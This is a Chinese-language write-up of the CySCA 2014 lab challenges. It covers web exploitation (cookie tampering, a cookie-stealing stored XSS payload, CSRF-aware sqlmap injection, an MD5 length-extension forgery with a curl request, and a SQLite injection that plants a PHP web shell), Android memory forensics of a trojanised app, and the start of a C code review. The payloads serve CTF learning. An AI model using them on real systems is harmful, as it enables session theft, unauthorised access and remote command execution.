# CySCA 2014（澳大利亚国家级网络安全挑战赛）

项目地址：https://download.vulnhub.com/cysca/CySCA2014InABox.7z

是一个打包好的镜像文件

**注意：导入 vmx 时一定要选择我已移动，否则没网**

使用 Nmap 扫描出开放服务及操作系统版本

## Web

### Club Status（Cookie 越权）

![](https://pic1.imgdb.cn/item/698f5b05e887663d376fdf54.png)

```
Only VIP and registered users are allowed to view the Blog. Become VIP to gain access to the Blog to reveal the hidden flag.
```

描述只有 VIP 才能访问博客，发现在 Cookie 中有个 `vip` 参数

![](https://pic1.imgdb.cn/item/698f5c25e887663d376fdf5b.png)

改为 `1` 后可以访问，拿到 flag

![](https://pic1.imgdb.cn/item/698f5c78e887663d376fdf60.png)

### Om nom nom nom（存储型 Markdown XSS + Cookie 越权）

```
Gain access to the Blog as a registered user to reveal the hidden flag.
```

需要我们登录账号，但是不给注册

![](https://pic1.imgdb.cn/item/698f5e45e887663d376fdf75.png)

在博客中测试 XSS，被转义了

![](https://pic1.imgdb.cn/item/698f5fcfe887663d376fdf87.png)

观察到支持另一种 Markdown 语法，测试发现标题名存在 XSS 反而不是链接

```javascript
[<script>alert('test');</script>](http://www.baidu.com)
```

![](https://pic1.imgdb.cn/item/698f6112e887663d376fdfb4.png)

在每个博客中都插入获取 Cookie 的 Payload

```javascript
[<script>$(function(){$.post("",{comment:document.cookie});})</script>](http://a.com)
```

第二个博客有新的 Cookie

![](https://pic1.imgdb.cn/item/698f61d2e887663d376fdfc4.png)

替换 Cookie 登录其他用户拿到 flag

![](https://pic1.imgdb.cn/item/698f625ae887663d376fdfc9.png)

### Nonce-sense（CSRF 令牌同步 + SQL 注入）

```
Retrieve the hidden flag from the database.
```

在博客文章的评论删除功能中，每个评论旁边都有一个“删除评论”按钮

![](https://pic1.imgdb.cn/item/6993d821c15d9f0177905b72.png)

找到源代码

![](https://pic1.imgdb.cn/item/6993d95bc15d9f0177905b7c.png)

```javascript
window.csrf = 'cad6663a9a2b9956';
function deletecomment(obj, id) {
  $.post('/deletecomment.php', {csrf: window.csrf, comment_id: id}).done(function(data) {
    if (data['result']) {
      $(obj).parent().remove();
      window.csrf = data['csrf'];
    }
  });
}
```

测试存在 SQL 注入漏洞

```
{"result":false,"error":"You have an error in your SQL syntax; ... near ''' at line 1","csrf":"..."}
```

但是发现每次请求的 `csrf` 值都会产生变化

![](https://pic1.imgdb.cn/item/6993d9b6c15d9f0177905b81.png)

SQLMap 无法自动处理这种情况，因此我们将使用一个 `--eval` 选项和一个 Python 脚本来创建有效的请求

创建一个名为 `deletecomment.txt` 的文件，内容为 HTTP 请求的原始格式，其中 `csrf` 参数的值用占位符 `replace_me` 标记

```http
POST /deletecomment.php HTTP/1.1
Host: 192.168.187.135
Cookie: PHPSESSID=okmdg60n0cvqerquobnc7lsho3;vip=0

csrf=replace_me&comment_id=1
```

脚本代码如下

```python
import urllib.request
import re

def get_csrf():
    """
    获取当前有效的CSRF令牌。
    通过访问博客页面，从页面JavaScript变量 window.csrf 中提取令牌值。
    返回值为字符串形式的令牌。
    """
    # 构建对博客页面的请求对象，指定 URL
    req = urllib.request.Request('http://192.168.187.135/blog.php?view=2')
    # 添加 Cookie 头
    req.add_header('Cookie', 'PHPSESSID=你的会话ID')

    # 发送请求并获取响应（使用 with 语句自动管理资源）
    with urllib.request.urlopen(req) as response:
        # 读取响应内容（字节流），并用 UTF-8 解码为字符串
        page = response.read().decode('utf-8')

    # 使用正则表达式匹配 window.csrf = '令牌值'; 的形式，提取令牌
    match = re.search(r"window\.csrf = '(.+)';", page)
    if match:
        # 如果匹配成功，返回第一个捕获组（即令牌字符串）
        return match.group(1)
    else:
        # 如果未找到令牌，抛出异常，便于调试
        raise Exception('CSRF token not found')
```

SQLMap 运行脚本

```bash
sqlmap -r deletecomment.txt --eval="import sys; sys.path.append('/home/kali'); import cysca_csrf; csrf=cysca_csrf.get_csrf()"
```

**注意**：当出现 `POST parameter 'csrf' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N]` 提示时，输入 **`n`** 并回车（因为我们已通过 `--eval` 手动处理令牌）

![](https://pic1.imgdb.cn/item/6993e0b3c15d9f0177905bf4.png)

拿到 flag

![](https://pic1.imgdb.cn/item/6993e171c15d9f0177905bfd.png)

### Hypertextension（Hash 长度扩展攻击）

```
Retrieve the hidden flag by gaining access to the caching control panel.
```

让我们重点关注 API 文档

![](https://pic1.imgdb.cn/item/6993e278c15d9f0177905c06.png)

文档如下

![](https://pic1.imgdb.cn/item/6993e2abc15d9f0177905c0a.png)

| 方法   | 路径                        | 功能     | 请求参数                                    | 响应                             |
| ---- | ------------------------- | ------ | --------------------------------------- | ------------------------------ |
| GET  | `/api/documents`          | 列出所有文档 | 无                                       | JSON 格式的文档元数据                  |
| GET  | `/api/documents/id/<uid>` | 下载指定文档 | `uid` 路径参数                              | 文档原始数据（正文），元数据在 `X-Metadata` 头 |
| POST | `/api/documents`          | 创建文档记录 | `filepath`（文件路径）、`contenttype`（MIME 类型） | JSON 格式的新文档 URI                |
| PUT  | `/api/documents/id/<uid>` | 更新文档记录 | `uid` 路径参数 + `filepath`、`contenttype`   | 空 JSON 数组                      |

服务器生成签名的逻辑是：

1. 拿到你的参数（比如 `foo=1, bar=2`）

2. 按字母顺序排序并拼接：`bar2foo1`

3. **在前面加上一个只有服务器知道的 `SECRET`**：`SECRETbar2foo1`

4. 计算这个字符串的 **MD5**

如果我们向 `index.php` 文档系统中添加内容，应该能够查看其源代码。但不知道 `SECRET` 是什么

**哈希长度扩展攻击原理：**

简单来说，MD5 是**分块处理**数据的。如果你知道 `MD5(SECRET + 现有数据)` 的值，即使你不知道 `SECRET` 是什么，你也可以在“现有数据”后面接上“新数据”，并算出 `MD5(SECRET + 现有数据 + 填充 + 新数据)`

继上一关 SQL 注入拿到日志

```sql
+----+-----------------------------------------------------------------------------------------------------------------------------------+------------------+----------+---------------------+-----------------------------+
| id | params                                                                                                                            | api_key          | method   | created_on          | request_uri                 |
+----+-----------------------------------------------------------------------------------------------------------------------------------+------------------+----------+---------------------+-----------------------------+
| 1  | contenttype=application%2Fpdf&filepath=.%2Fdocuments%2FTop_4_Mitigations.pdf&api_sig=235aca08775a2070642013200d70097a             | b32GjABvSf1Eiqry | POST     | 2014-02-21 09:27:20 | \\/api\\/documents          |
| 2  | _url=%2Fdocuments&id=2                                                                                                            | NULL             | GET      | 2014-02-21 11:47:01 | \\/api\\/documents\\/id\\/2 |
| 3  | contenttype=text%2Fplain&filepath=.%2Fdocuments%2Frest-api.txt&api_sig=95a0e7dbe06fb7b77b6a1980e2d0ad7d                           | b32GjABvSf1Eiqry | POST     | 2014-02-21 11:54:31 | \\/api\\/documents          |
| 4  | _url=%2Fdocuments&id=3&contenttype=text%2Fplain&filepath=.%2Fdocuments%2Frest-api-v2.txt&api_sig=6854c04381284dac9970625820a8d32b | b32GjABvSf1Eiqry | PUT      | 2014-02-21 12:07:43 | \\/api\\/documents\\/id\\/3 |
| 5  | _url=%2Fdocuments&id=3                                                                                                            | NULL             | GET      | 2026-02-14 04:14:47 | \\/api\\/documents\\/id\\/3 |
| 6  | _url=%2Fdocuments&id=3                                                                                                            | NULL             | GET      | 2026-02-17 14:35:28 | \\/api\\/documents\\/id\\/3 |
| 7  | _url=%2Fdocuments&id=3                                                                                                            | NULL             | GET      | 2026-02-17 14:36:43 | \\/api\\/documents\\/id\\/3 |
| 8  | _url=%2Fdocuments&id=3                                                                                                            | NULL             | GET      | 2026-02-17 15:41:22 | \\/api\\/documents\\/id\\/3 |
+----+-----------------------------------------------------------------------------------------------------------------------------------+------------------+----------+---------------------+-----------------------------+
```

从日志（`rest_api_log.csv`）里偷到了一个现成的合法请求：

- **参数：** `contenttype=application/pdf`, `filepath=./documents/Top_4_Mitigations.pdf`

- **对应签名：** `235aca08775a2070642013200d70097a`

通过长度扩展攻击工具（比如 `hashpump` 或 Python 脚本）计算新签名，输入：

- 旧签名：`235aca08775a2070642013200d70097a`

- 旧数据：`contenttypeapplication/pdffilepath./documents/Top_4_Mitigations.pdf`

- 新数据：`contenttypetext/plainfilepathindex.php`

- 尝试 `SECRET` 的长度（从 1 猜到 20）

首先下载并且编译工具 HashPump

我们把每次尝试 `k` 值生成的 Hash 和字符串用 curl 提交到服务器，直到服务器提示成功为止

过多次测试，我们发现 k 值是 16

| 参数       | 值                                                             | 含义                              |
| -------- | ------------------------------------------------------------- | ------------------------------- |
| `-s`     | `6854c04381284dac9970625820a8d32b`                            | 原始哈希值，即 `H(secret \| data)` 的结果 |
| `--data` | `contenttypetext/plainfilepath./documents/rest-api-v2.txtid3` | 已知的原始数据部分 `data`                |
| `-a`     | `contenttypetext/plainfilepath./index.phpid3`                 | 攻击者想追加的新数据 `append`             |
| `-k`     | `16`                                                          | 猜测的密钥长度（字节），这里是16字节             |

```bash
# ./hashpump -s 6854c04381284dac9970625820a8d32b --data "contenttypetext/plainfilepath./documents/rest-api-v2.txtid3" -a "contenttypetext/plainfilepath./index.phpid3" -k 16
4625e458d07cb19da70effa3d1c6dc14
contenttypetext/plainfilepath./documents/rest-api-v2.txtid3\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00X\x02\x00\x00\x00\x00\x00\x00contenttypetext/plainfilepath./index.phpid3
```

接下来我们就成功获取了 `index.php` 的源码，成功的把 `index.php` 的源码作为`document/id/3` 保存

1. **服务器的签名逻辑：** 把**所有参数名和参数值**按字母顺序排序并拼接

2. 所以我们可以定义了一个参数名叫做 `c`

3. 你需要让服务器拼接出的字符串**开头部分**刚好是：`ontenttypeapplication/pdffilepath...`（这是旧请求的内容）

4. 这样，当服务器按字母顺序排序时，`c` 排在最前面

5. 服务器拼接后的字符串就变成了：`SECRET` + `c` 的值 + `contenttype` 的值 + `filepath` 的值
   
   | **部分**             | **内容**                                      | **作用**          |
   | ------------------ | ------------------------------------------- | --------------- |
   | **Secret**         | `SECRET`                                    | 签名              |
   | **参数 c 的名和值**      | `contentiontypeapplication/pdf...<padding>` | **强行伪造出旧数据的样子** |
   | **参数 contenttype** | `contenttypetext/plain`                     | 你的新参数           |
   | **参数 filepath**    | `filepathindex.php`                         | 你的恶意目标          |

```bash
curl -X PUT \
  -d 'c=ontenttypetext/plainfilepath./documents/rest-api-v2.txtid3%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00X%02%00%00%00%00%00%00&contenttype=text/plain&filepath=./index.php&api_sig=4625e458d07cb19da70effa3d1c6dc14' \
  -H 'X-Auth: b32GjABvSf1Eiqry' \
  http://172.16.1.80/api/documents/id/3
```

```php
<?php
// Not in production... >see /cache.php?access=<secret>
include('../lib/caching.php');
if (isset($_GET['debug'])) {
readFromCache(
);
```

似乎这个 `cache.php` 有点意思，我们改改上面的 Hash 长度攻击利用代码，把 `index.php` 换成 `cache.php`，这次我们成功的拿到了 flag

```php
$flag = 'OrganicPamperSenator877';
if ($_GET['access'] != md5($flag)) {
header('Location: /index.php');
die();
```

### Injeption（SQLite SQL 注入 GetShell）

```
Reveal the final flag, which is hidden in the /flag.txt file on the web server.
```

上一题 `cache.php` 里面的源码最后写了，提交的参数 access 的值必须是上一题 flag 的md5

浏览器打开 `cache.php?access=f4fa5dc42fd0b12a098fcc218059e061` 显示的是一个很简单的表单

表单提交了两个参数，URI 和标题，在 `cache.php` 里面对这两个参数严格检查，比如 URI 参数前面必须是 `http://` 开头，服务器必须是本地，然后这个 URI 必须真实存在，不能是 404

标题被限制在 40 字符以内，但是不会过滤引号，似乎可以被注入

我们尝试在标题里提交 `/*` ,返回了错误信息:

```
near "/*', '59ab7c9e3917a154ff56a43d08a262ab','http%3A%2F%2F172.16.1.80%2Findex.php', '...', datetime('now'))": syntax error
```

源码中的 `setCache` 函数直接将变量拼接进 SQL 语句：

```sql
INSERT INTO cache VALUES ('$title', '$key', '$uri', '$data', datetime('now'))
```

虽然 `$key`、`$title`、`$uri` 都有长度限制或编码处理，但 **`$data`** 是通过 `file_get_contents($uri)` 获取的远程/本地页面内容

**这意味着，只要我们能控制 `$uri` 指向的内容，就能控制插入数据库的 `$data`**

SQLite 有个神奇的特性：`ATTACH DATABASE 'file.php' AS a;`。

- 它会创建一个新的数据库文件。如果文件名叫 `test.php`，SQLite 会把它当作数据库处理

- 当我们向这个 `a` 库的表中插入一段 PHP 代码时，这段代码会以**明文**形式存储在该文件中

- **Web 渲染特性：** 当 PHP 解释器访问 `test.php` 时，它会忽略掉 SQLite 的二进制乱码，只执行 `<?php ... ?>` 标签内的代码

第一阶段：构造 Payload

由于我们不能直接在 `title` 或 `uri` 里塞下巨大的 Payload（受长度和 `urlencode` 限制），我们需要利用 `cache.php` 自己的**显示功能**

1. **提交第一个请求：** 在 `uri` 参数里构造包含 SQL 注入语句的字符串。虽然它被编码存储了，但当你在页面上查看缓存列表时，它会被 **原样渲染** 在 HTML 表格里。

2. **Payload 设计：** `test', datetime('now')); ATTACH DATABASE 'test.php' ... --` 这个 Payload 的目的是闭合前面的单引号，然后利用 **分号 (;) 执行堆叠查询**
   
   ```sql
   ',0); ATTACH DATABASE 'a.php' AS a; CREATE TABLE a.b (c text); INSERT INTO a.b VALUES ('<? system($_GET[''cmd'']); ?>');/* 
   ```

第二阶段：触发注入

1. **提交第二个请求：** 这次将 `uri` 指向 `http://host/cache.php`（即页面本身）。

2. **执行流：**
   
   - `setCache` 调用 `file_get_contents('cache.php')`
   
   - 此时 `$data` 拿到了刚才第一步留在页面上的那个 Payload
   
   - SQL 执行变成了：`INSERT INTO cache VALUES (..., '...内容... [Payload] ...内容...', ...)`
   
   - **由于 Payload 包含单引号和分号，它强行切断了原始 INSERT，转而执行了 `ATTACH DATABASE` 和 `INSERT INTO a.tbl`**

第三阶段：收割 Flag

访问 `http://host/test.php`，服务器执行了我们注入的 `file_get_contents('/flag.txt')`，Flag 到手

## Android Forensics

### Flappy Bird（恶意进程）

```
识别设备上的可疑应用程序
a 识别手机上可疑应用程序的 PID
b 与此流程相关联的 uid 是什么
c 流程何时开始
注 PIDS 1454、1461、1468 的进程用于转储内存可以忽略。
示例答案格式【1234】【4321】【0000-00-00 00:00:00 UTC+0000】
```

**使用 Vol 2.3 及以下版本取证，查看内存镜像进程列表**

我们发现 PID 14、1255 是两个 Shell 进程

```
root@kali:/opt/volatility# python vol.py linux_psaux -f /opt/memory.dmp --profile=Linuxgoldfish-2_6_29ARM
Volatility Foundation Volatility Framework 2.6.1
Pid    Uid    Gid    Arguments                                                       
1      0      0      /init                                                           
2      0      0      [kthreadd]                                                      
3      0      0      [ksoftirqd/0]                                                   
4      0      0      [events/0]                                                      
5      0      0      [khelper]                                                       
6      0      0      [suspend]                                                       
7      0      0      [kblockd/0]                                                     
8      0      0      [cqueue]                                                        
9      0      0      [kseriod]                                                       
10     0      0      [kmmcd]                                                         
11     0      0      [pdflush]                                                       
12     0      0      [pdflush]                                                       
13     0      0      [kswapd0]                                                       
14     0      0      [aio/0]                                                         
24     0      0      [mtdblockd]                                                     
25     0      0      [kstriped]                                                      
26     0      0      [hid_compat]                                                    
29     0      0      [rpciod/0]                                                      
30     0      0      [mmcqd]                                                         
31     0      0      /sbin/ueventd                                                   
32     1000   1000   /system/bin/servicemanager                                      
33     0      0      /system/bin/vold                                                
35     0      0      /system/bin/netd                                                
36     0      0      /system/bin/debuggerd                                           
37     1001   1001   /system/bin/rild                                                
38     1000   1003   /system/bin/surfaceflinger                                      
39     0      0      zygote /bin/app_process -Xzygote /system/bin --zygote --start-system-server
40     1019   1019   /system/bin/drmserver                                           
41     1013   1005   /system/bin/mediaserver                                         
42     0      0      /system/bin/installd                                            
43     1017   1017   /system/bin/keystore /data/misc/keystore                        
44     0      0      /system/bin/qemud                                               
47     2000   1007   /system/bin/sh                                                  
48     0      0      /sbin/adbd                                                      
220    1000   1000   system_server                                                              
276    10033  10033  com.android.systemui                                                       
308    1001   1001   com.android.phone                                                          
324    10014  10014  com.android.launcher                                                       
354    10010  10010  android.process.acore                                                      
462    10051  10051  com.outlook.Z7:engine                                                      
477    10036  10036  com.android.inputmethod.latin                                              
530    10007  10007  android.process.media                                                      
554    10045  10045  com.twitter.android                                                        
568    10030  10030  com.android.email                                                          
671    10049  10049  com.lidroid.fileexplorer:bdservice_v1                                      
727    10056  10056  local.weather.forecast.pro                                                 
928    10059  10059  com.estrongs.android.pop                                                   
959    10059  10059  /data/data/com.estrongs.android.pop/files/libestool2.so 39623 /data/data/com.estrongs.android.pop/files/comm/tool_port
975    10018  10018  com.android.packageinstaller                                               
988    10029  10029  com.android.defcontainer                                                   
1003   10015  10015  com.svox.pico                                                              
1016   10057  10057  cm.aptoide.pt                                                              
1036   10006  10006  com.android.quicksearchbox                                                 
1095   10046  10046  com.devhd.feedly                                                           
1141   10052  10052  com.foobnix.pdf.reader                                                     
1185   10061  10061  org.jtb.httpmon                                                            
1221   10019  10019  com.android.mms                                                            
1255   10061  10061  sh                                                              
1321   10010  10010  com.android.contacts                                                       
1368   10047  10047  com.blueinfinity.photo                                                     
1420   1000   1000   com.android.settings                                                       
1454   0      0      /system/bin/sh -                                                
1461   0      0      sh                                                              
1468   0      0      insmod lime.ko path=/sdcard/mem.dmp format=lime  
```

**PID 47** `/system/bin/sh` 的 UID/GID 为 2000/1007，对应 shell 用户，可能来自 adb 调试

PID 1255 属于 GID 10061 它有另一个 PID 1185 `org.jtb.httpmon` 是可疑进程

让我们继续深入分析这个过程

![](https://pic1.imgdb.cn/item/69a2def09a625e9b80b2e738.png)

使用文件列表分析进程 Lsof 让我们能清晰地看到它正在访问哪些资源

```bash
root@ubuntu:/opt/volatility-2.4# python vol.py -f /opt/memory.dmp --profile=Linuxgoldfish-2_6_29ARM linux_lsof -p 1185
Pid      FD       Path
-------- -------- ----
    1185        0 /dev/null
    1185        1 /dev/null
    1185        2 /dev/null
    1185        3 /dev/log/main
    1185        4 /dev/log/radio
    1185        5 /dev/log/events
    1185        6 /system/framework/core.jar
    1185        7 /system/framework/core-junit.jar
    1185        8 /dev/__properties__
    1185        9 /dev/binder
    1185       10 /system/framework/bouncycastle.jar
    1185       11 /system/framework/ext.jar
    1185       12 /system/framework/framework.jar
    1185       13 /system/framework/android.policy.jar
    1185       14 /system/framework/services.jar
    1185       15 /system/framework/apache-xml.jar
    1185       16 /system/framework/framework.jar
    1185       17 /system/framework/framework-res.apk
    1185       18 /system/etc/system_fonts.xml
    1185       19 /system/etc/fallback_fonts.xml
    1185       20 /system/framework/core.jar
    1185       21 /dev/urandom
    1185       22 pipe:[4570]
    1185       23 /dev/cpuctl/apps/tasks
    1185       24 /dev/cpuctl/apps/bg_non_interactive/tasks
    1185       25 socket:[4567]
    1185       26 pipe:[4568]
    1185       27 pipe:[4568]
    1185       28 pipe:[4570]
    1185       29 /anon_inode:/[eventpoll]
    1185       30 /dev/ashmem
    1185       31 /dev/ashmem
    1185       32 /data/app/org.jtb.httpmon-1.apk
    1185       33 /data/app/org.jtb.httpmon-1.apk
    1185       34 /data/app/org.jtb.httpmon-1.apk
    1185       35 pipe:[4586]
    1185       36 pipe:[4586]
    1185       37 /anon_inode:/[eventpoll]
    1185       38 socket:[4594]
    1185       39 /data/data/org.jtb.httpmon/files/UpdateService.jar
    1185       40 /data/data/org.jtb.httpmon/files/UpdateService.jar
    1185       41 /data/data/org.jtb.httpmon/files/rathrazdaeizaztaxchj.jar
    1185       42 /data/data/org.jtb.httpmon/files/rathrazdaeizaztaxchj.jar
    1185       43 /727/task/1538
    1185       46 /1185/task/1531
    1185       47 /data/org.jtb.httpmon/shared_prefs/org.jtb.httpmon_preferences.xml.bak
    1185       48 /1185/task/1531
    1185       49 pipe:[4791]
    1185       50 pipe:[4792]
    1185       51 []
    1185       52 pipe:[4793]
    1185       53 /727/task/1538
    1185       55 /meminfo
    1185       56 pipe:[6535]
    1185       58 pipe:[6535]
    1185       59 /anon_inode:/[eventpoll]
    1185       60 /system/batterystats.bin
```

应用私有目录下的 JAR 文件

```bash
39 /data/data/org.jtb.httpmon/files/UpdateService.jar
40 /data/data/org.jtb.httpmon/files/UpdateService.jar
41 /data/data/org.jtb.httpmon/files/rathrazdaeizaztaxchj.jar
42 /data/data/org.jtb.httpmon/files/rathrazdaeizaztaxchj.jar
```

我们现在可以确认这个过程 PID 1185 绝对可疑

原因是应用程序通过 Google Play 商店更新而不是通过 "已下载并执行" JAR 文件

![](https://pic1.imgdb.cn/item/69a2e0429a625e9b80b2e758.png)

### Tower of Medivh（恶意软件）

```
提供用于允许安装包的漏洞的 CVE
示例答案格式【CVE-2000-0001】
```

打印进程内存的详细信息包括堆堆栈和共享库

可以看到有个 APK 在进程里面

```bash
root@ubuntu:/opt/volatility-2.3.1# python vol.py -f /opt/memory.dmp --profile=Linuxgoldfish-2_6_29ARM linux_proc_maps -p 1185
Volatility Foundation Volatility Framework 2.3.1
Pid      Start              End                Flags       Pgoff Major  Minor  Inode      File Path                                                                       
-------- ------------------ ------------------ ------ ---------- ------ ------ ---------- --------------------------------------------------------------------------------

    1185 0x000000004b878000 0x000000004b87a000 r--       0x1d000     31      1       1063 /data/app/org.jtb.httpmon-1.apk                                                 
    1185 0x000000004b87a000 0x000000004b87e000 r--       0x10000     31      1       1063 /data/app/org.jtb.httpmon-1.apk                                                 
    1185 0x000000004b87e000 0x000000004b881000 rw-           0x0      0      7       4573 /dev/ashmem/dalvik-aux-structure                                                
    1185 0x000000004b881000 0x000000004b882000 r--           0x0     31      1       1220 /data/data/org.jtb.httpmon/files/UpdateService.dex                              
    1185 0x000000004b882000 0x000000004b883000 rw-           0x0      0      7       4686 /dev/ashmem/dalvik-aux-structure                                                
    1185 0x000000004b883000 0x000000004b884000 r--        0x9000     31      1       1230 /data/data/org.jtb.httpmon/files/rathrazdaeizaztaxchj.jar                       
    1185 0x000000004b885000 0x000000004b889000 rw-           0x0      0      0          0                                                                                 
    1185 0x000000004b88f000 0x000000004b891000 r--       0x1d000     31      1       1063 /data/app/org.jtb.httpmon-1.apk                                                 
    1185 0x000000004b891000 0x000000004b8aa000 r--           0x0     31      1       1094 /data/dalvik-cache/data@app@org.jtb.httpmon-1.apk@classes.dex                   
    1185 0x000000004b8aa000 0x000000004b8c2000 r--           0x0     31      1       1240 /data/data/org.jtb.httpmon/files/rathrazdaeizaztaxchj.dex                       
    1185 0x000000004b8c2000 0x000000004b8c5000 rw-           0x0      0      7       4706 /dev/ashmem/dalvik-aux-structure
```

用病毒扫描工具发现以下信息

```bash
root@ddddd:~# clamscan /tmp/test.apk 
/tmp/test.apk: BC.Legacy.Exploit.Andr-2.Master_Key FOUND

----------- SCAN SUMMARY -----------
Known viruses: 6284735
Engine version: 0.100.3
Scanned directories: 0
Scanned files: 1
Infected files: 1
Data scanned: 0.52 MB
Data read: 0.12 MB (ratio 4.40:1)
Time: 168.576 sec (2 m 48 s)
```

看到这个 `BC.Legacy.Exploit.Andr-2.Master_Key` 搜索 "Android Master Key CVE" 我们发现答案并捕获我们的第二个旗帜

![](https://pic1.imgdb.cn/item/69a2e4869a625e9b80b2e7bd.png)

### Wrath（恶意软件）

```
确定其他有效载荷阶段
a 恶意软件的第二和第三Java阶段的文件路径是什么
b 这两个文件的文件大小是多少字节
c 两个阶段使用的公开命名恶意软件是什么
示例答案格式[/dir/dir/filename1.ext/dir/dir/filename2.ext][12345 54321][malwarerat]
```

继续深入看看找到一个 `.db` 文件

![](https://pic1.imgdb.cn/item/69a2e5579a625e9b80b2e7d1.png)

使用文本方式打开得知

Mkie 将正常的 APK 弄成了病毒再使用 CVE 漏洞伪造了签名

```
Hi Kevin,

I'm a big fan of your site and I saw that your it went down over the weekend! :( If you want a good application to monitor this kind of activity you should use httpmon
(http://www.megafileupload.com/en/file/502128/org-jtb-httpmon-apk.html); it's signed by the author if your worried about rogue apps ;)

Let me know if you have any problems!

Mike
```

拿到 Java 文件路径

![](https://pic1.imgdb.cn/item/69a2e9ed9a625e9b80b3211b.png)

文件大小

![](https://pic1.imgdb.cn/item/69a2ea2d9a625e9b80b32123.png)

接下来反编译两个 JAR 文件

然后恶意软件的名字就是 Metasploit-JavaPayload

![](https://pic1.imgdb.cn/item/69a2ea5e9a625e9b80b32125.png)

### Scams Through The Portal（恶意软件）

```
调查攻击向量
a 提供恶意应用程序在手机上的原始位置的完整路径
b 提供恶意软件最初下载位置的 IP
c 负责该妥协的人的电子邮件地址是什么
示例答案格式[/dir/dir/filename.ext][127.0.0.1][email@domain.com]
```

`linux_dentry_cache` 为每个活动安装点恢复内存中的文件系统还可以恢复以前删除的文件的文件名

找到了一个 APK

![](https://pic1.imgdb.cn/item/69a2ec689a625e9b80b3215c.png)

对于下载文件信息找到了 `.db` 文件

![](https://pic1.imgdb.cn/item/69a2ecd19a625e9b80b32164.png)

打开 `.db` 文件可以看到里面的下载信息

![](https://pic1.imgdb.cn/item/69a2ecfe9a625e9b80b32166.png)

对于 C 我们可以搜索 email 的信息我们之前看到 boby 的数据库找到了一封邮件还有另外一个数据库没有看

账号

![](https://pic1.imgdb.cn/item/69a2ed4f9a625e9b80b32170.png)

邮件消息看到账号 mike.joss@hushmail.com

![](https://pic1.imgdb.cn/item/69a2ed8b9a625e9b80b32176.png)

### hunter2（被盗文件）

```
有关已排出文件的信息
a 文件被盗前被复制到哪里
b 被偷的 ** 是什么
c 导出的 PDF 文档的完整路径是什么
示例应答格式 [/dir/dir/stagedir/][用户名/密码][/dir/dir/filename.ext]
```

这里我们重新看 PID 1255 进程的映射

![](https://pic1.imgdb.cn/item/69a41516f070dc0f83deec07.png)

查看进程的堆栈

![](https://pic1.imgdb.cn/item/69a415faf070dc0f83deec28.png)

查看这些文件找信息

被盗文件被复制到 `/data/data/org.jtb.httpmon/files/a/` 文件夹中

然后账号和密码都在上图里面

最后 C 的 PDF 则在前面就已经搜索出来了

### Electronic Sheep（恶意域名端口）

```
恶意应用分析
a 与恶意软件相关的恶意域和端口是什么
b 什么是修改到恶意代码的现有类方法 Java
示例答案格式 [domain.com:1234][methodname]
```

现在让我们回到一开始当我们解压 APK 的时候会生成两个 dex

![](https://pic1.imgdb.cn/item/69a4178cf070dc0f83deec61.png)

我们使用 dex2jar 将 dex 转换成 JAR

解压它们用 `diff` 命令查看两者的不同

```bash
root@ubuntu:/tmp/1# diff -r 0 1
Only in 0/jtb/httpmon: MonitorService$3.class
Binary files 0/jtb/httpmon/MonitorService.class and 1/jtb/httpmon/MonitorService.class differ
root@ubuntu:/tmp/1#
```

目录0中存在一个名为 `MonitorService$3.class` 的内部类文件，但在目录1中缺失

反编译看看

![](https://pic1.imgdb.cn/item/69a41d5cf070dc0f83deed8d.png)

逆向一步一步走

![](https://pic1.imgdb.cn/item/69a41da3f070dc0f83deedb0.png)

在这里面有两段加密的字符串 `aHR0cG1vbi5hbmRyb2lkc2hhcmUubmV0` 和 `NDQz` 测试发现是 Base64 加密

```
httpmon.androidshare.net:443
```

## Random

### Pulp Fiction（二进制图像隐写）

拿到图片后使用 GIMP 打开，需要尝试出正确的宽高

![](https://pic1.imgdb.cn/item/699f0419fd73d871e62fcfa5.png)

然后垂直翻转

![](https://pic1.imgdb.cn/item/699f0450fd73d871e62fd075.png)

### Spanish Trout（strncmp 截断绕过）

```
Fortcerts 受 Mad Programming Skillz Pty. Ltd. 委托
对其众多产品中使用的密码检查算法进行源代码审查，以查找其中的漏洞
Fortcerts 不具备 C 代码审计方面的专业知识，因此他们邀请您进行审查
请尝试查找任何漏洞并获取 flag，以证明攻击者可以利用已识别的漏洞
测试代码运行在 192.168.187.135:12345
```

查看给出的源代码

它接收客户端发送的密码，计算其 SHA1 哈希值，并与预先存储的密钥（从文件中加载）的 SHA1 哈希值进行比较

如果匹配，则返回密钥明文作为奖励；否则返回用户密码的哈希和正确密钥的哈希，让用户知道不匹配

```c
void handle_client(int client_socket)
{
    unsigned char hash[SHA_DIGEST_LENGTH];          // 存储用户输入密码的SHA1哈希值
    unsigned char secret_hash[SHA_DIGEST_LENGTH];   // 存储实际密钥的SHA1哈希值

    char secret_key[256];                            // 存储从文件中加载的密钥（明文）
    char data[256] = {0};                            // 存储客户端发送的密码字符串，初始化为0

    // 向客户端发送欢迎信息并提示输入密码
    sendline(client_socket, "Welcome to the SHA password oracle.\n");
    sendline(client_socket, "Enter your password:");

    // 从客户端接收一行输入（密码），若失败则直接返回
    if (recvline(client_socket, data, sizeof(data)) == -1)
        return;

    // 计算用户输入密码的SHA1哈希值
    SHA1(data, strlen(data), hash);

    // 从文件中加载密钥（明文）并计算其SHA1哈希值
    size_t secret_length = load_flag(secret_key, sizeof(secret_key)); // 加载密钥，返回实际长度
    SHA1(secret_key, secret_length, secret_hash);                     // 计算密钥的哈希

    // 比较两个哈希值（二进制比较），判断密码是否正确
    if (strncmp(secret_hash, hash, SHA_DIGEST_LENGTH) == 0) {
        // 密码正确：构造包含密钥的祝贺消息并发送
        char buf[512] = {0};
        snprintf(buf, sizeof(buf)-1, "Congratulations: The key is %s", secret_key);
        sendline(client_socket, buf);
    } else {
        // 密码错误：将两个哈希值转换为十六进制字符串，发送错误提示
        char secret_hash_str[80] = {0};
        char hash_str[80] = {0};
        char buf[512] = {0};

        // 将二进制哈希值转换为可读的十六进制字符串
        bytes_to_string((unsigned char*)secret_hash, secret_hash_str, sizeof(secret_hash_str));
        bytes_to_string((unsigned char*)hash, hash_str, sizeof(hash_str));

        // 构造错误消息，告知用户其哈希值与正确的哈希值不匹配
